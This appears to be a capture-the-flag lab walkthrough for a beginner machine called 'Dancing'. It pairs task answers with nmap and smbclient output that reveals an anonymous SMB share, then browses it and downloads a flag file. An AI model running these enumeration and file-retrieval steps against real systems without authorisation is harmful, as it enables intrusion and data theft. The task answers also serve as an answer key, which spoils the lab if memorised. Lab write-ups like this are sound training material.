# Dancing
## task 1
Server Message Block
## task 2
445
## task 3
```
┌──(root㉿cbfc9d3c3a36)-[/mnt/src/starting_point/tier0/Dancing]
└─# nmap -sV <your target ip>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 02:53 UTC
Nmap scan report for <your target ip>
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.49 seconds
```
microsoft-ds
## task 4
```
-l
```
```
┌──(root㉿cbfc9d3c3a36)-[/mnt/src/starting_point/tier0/Dancing]
└─# smbclient -L 10.129.128.212
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
Reconnecting with SMB1 for workgroup listing.
```
## task 5
WorkShares
## task 6
```
get
```
## Submit Flag
```
┌──(root㉿cbfc9d3c3a36)-[/mnt/src/starting_point/tier0/Dancing]
└─# smbclient //<your target ip>/WorkShares
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 08:22:01 2021
  ..                                  D        0  Mon Mar 29 08:22:01 2021
  Amy.J                               D        0  Mon Mar 29 09:08:24 2021
  James.P                             D        0  Thu Jun  3 08:38:03 2021

                5114111 blocks of size 4096. 1751433 blocks available
smb: \> cd James.p
smb: \James.p\> ls
  .                                   D        0  Thu Jun  3 08:38:03 2021
  ..                                  D        0  Thu Jun  3 08:38:03 2021
  flag.txt                            A       32  Mon Mar 29 09:26:57 2021

                5114111 blocks of size 4096. 1751433 blocks available
smb: \James.p\> get flag.txt
getting file \James.p\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```